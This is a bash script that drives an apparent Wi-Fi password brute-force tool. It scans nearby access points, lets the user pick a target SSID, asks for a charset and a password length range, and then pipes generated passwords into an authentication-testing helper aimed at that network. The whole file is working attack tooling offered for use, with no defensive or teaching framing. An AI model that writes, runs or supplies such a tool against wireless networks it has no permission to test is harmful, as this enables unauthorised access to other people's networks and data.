#!/usr/bin/env bash
set -euo pipefail

DIR="$(cd "$(dirname "$0")/.." && pwd)"
CONFIG="$DIR/config/settings.yml"
INTERFACE="${1:-}"

config_val() {
    awk -F': *' -v key="$1" '$1 == key {
        gsub(/^"|"$/, "", $2); print $2; exit
    }' "$CONFIG" 2>/dev/null
}

scan_aps() {
    "$DIR/scripts/scan_wifi.sh" "$INTERFACE" 2>&1
}

select_ap() {
    local ssids=()
    if command -v nmcli &>/dev/null; then
        while IFS=: read -r ssid _; do
            [ -n "$ssid" ] && ssids+=("$ssid")
        done < <(nmcli -t -f SSID dev wifi list 2>/dev/null)
    fi

    if [ ${#ssids[@]} -eq 0 ]; then
        echo "[-] No access points found." >&2
        exit 1
    fi

    echo "[*] Select access point (1-${#ssids[@]}):" >&2
    select TARGET in "${ssids[@]}"; do
        if [[ -n "$TARGET" ]]; then
            echo "[+] Selected: $TARGET" >&2
            break
        fi
        echo "[-] Invalid selection, try again." >&2
    done
}

get_prompt() {
    local var=$1 label=$2 default=$3
    local val
    read -r -p "[*] $label [$default]: " val
    printf '%s\n' "${val:-$default}"
}

main() {
    [[ -z "$INTERFACE" ]] && INTERFACE=$(config_val interface)
    INTERFACE="${INTERFACE:-wlan0}"

    echo "[*] Scanning on $INTERFACE ..." >&2
    scan_aps
    echo >&2
    select_ap

    local def_charset def_min def_max def_limit
    def_charset=$(config_val charset);    def_charset="${def_charset:-all}"
    def_min=$(config_val min_length);     def_min="${def_min:-8}"
    def_max=$(config_val max_length);     def_max="${def_max:-8}"
    def_limit=0

    CHARSET=$(get_prompt charset "Charset preset" "$def_charset")
    MIN=$(get_prompt min "Min password length" "$def_min")
    MAX=$(get_prompt max "Max password length" "$def_max")
    LIMIT=$(get_prompt limit "Limit attempts (0 = unlimited)" "$def_limit")

    echo >&2
    echo "[*] Starting brute-force on '$TARGET'" >&2
    echo "[*] Charset: $CHARSET  |  Length: $MIN-$MAX  |  Limit: $LIMIT" >&2
    echo "[*] $(date)" >&2
    echo >&2

    "$DIR/scripts/gen_passwords.py" \
        --charset "$CHARSET" --min "$MIN" --max "$MAX" --limit "$LIMIT" | \
    "$DIR/scripts/auth_test.py" \
        --ssid "$TARGET" --interface "$INTERFACE" --limit "$LIMIT"
}

main
